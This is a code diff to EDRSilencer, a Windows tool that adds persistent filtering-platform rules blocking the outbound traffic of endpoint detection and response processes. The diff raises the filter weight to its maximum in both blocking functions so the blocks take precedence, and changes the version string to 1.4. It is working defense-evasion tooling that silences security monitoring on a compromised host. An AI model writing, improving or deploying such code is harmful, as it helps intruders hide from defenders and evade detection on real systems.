@@ -172,6 +172,9 @@ void BlockEdrProcessTraffic() {
                 filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
                 filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
                 filter.action.type = FWP_ACTION_BLOCK;
+                UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
+                filter.weight.type = FWP_UINT64;
+                filter.weight.uint64 = &weightValue;
                 cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
                 cond.matchType = FWP_MATCH_EQUAL;
                 cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
@@ -277,6 +280,9 @@ void BlockProcessTraffic(char* fullPath) {
     filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
     filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
     filter.action.type = FWP_ACTION_BLOCK;
+    UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
+    filter.weight.type = FWP_UINT64;
+    filter.weight.uint64 = &weightValue;
     cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
     cond.matchType = FWP_MATCH_EQUAL;
     cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
@@ -428,7 +434,7 @@ void UnblockWfpFilter(UINT64 filterId) {
 
 void PrintHelp() {
     printf("Usage: EDRSilencer.exe <blockedr/block/unblockall/unblock>\n");
-    printf("Version: 1.3\n");
+    printf("Version: 1.4\n");
     printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:\n");
     printf("  EDRSilencer.exe blockedr\n\n");
     printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):\n");
